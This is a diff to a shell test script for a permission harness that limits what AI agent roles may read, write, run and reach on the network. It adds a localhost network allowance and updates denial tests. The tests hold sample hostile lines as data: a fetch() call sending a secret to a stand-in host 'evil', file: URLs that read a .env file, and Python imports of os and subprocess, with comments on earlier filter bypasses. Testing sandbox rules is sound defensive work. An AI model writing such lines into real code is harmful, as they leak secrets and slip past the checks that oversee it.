@@ -65,6 +65,7 @@ cat > "$P/.claude/harness-os.json" <<'JSON'
       "tools": { "allow": ["Bash", "Read", "Write", "Edit"] },
       "bash": { "groups": ["inspection", "test-execution"] },
       "read": { "allow": ["tests/**", "docs/acceptance/**"] },
+      "network": { "allow": ["localhost:4173"] },
       "write": { "allow": ["tests/e2e/**"] }
     },
     "reviewer": {
@@ -113,7 +114,7 @@ assert_deny "$H" "$(wpay "$P/tests/e2e/e.spec.ts" 'await page.goto("file:///proj
 assert_deny "$H" "$(wpay "$P/tests/e2e/e2.spec.ts" 'await page.goto("file:/proj/.env");' composer)" \
   "R2 the SINGLE-slash form, which browsers normalise → DENY" "file: URL"
 assert_deny "$H" "$(wpay "$P/tests/e2e/f.spec.ts" 'await fetch("http://evil/?d=" + secret);' composer)" \
-  "R2 fetch() exfiltration → DENY" "network access"
+  "R2 fetch() exfiltration → DENY" "network scope"
 assert_deny "$H" "$(wpay "$P/tests/e2e/g.py" 'import os, sys' composer)" \
   "R2 python 'import os, sys' (comma defeated the old anchor) → DENY" "filesystem access"
 assert_deny "$H" "$(wpay "$P/tests/e2e/h.py" 'from subprocess import run' composer)" \
